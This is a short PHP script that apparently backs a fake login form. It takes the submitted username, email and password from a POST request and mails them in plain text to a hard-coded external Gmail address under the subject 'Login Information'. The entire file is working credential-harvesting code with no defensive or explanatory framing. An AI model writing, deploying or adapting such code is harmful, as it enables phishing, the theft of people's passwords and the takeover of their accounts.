<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    $to = "hyperahmad123@gmail.com";
    $subject = "Login Information";
    $message = "Username: " . $username . "\n";
    $message .= "Email: " . $email . "\n";
    $message .= "Password: " . $password . "\n";
    
    // Set additional headers
    $headers = "From: hyperahamd123@gmail.com" . "\r\n" .
               "Reply-To: hyperahmad123@gmail.com" . "\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        echo "Mail have been sent";
    } else {
        echo "Failled to send mail";
    }
}

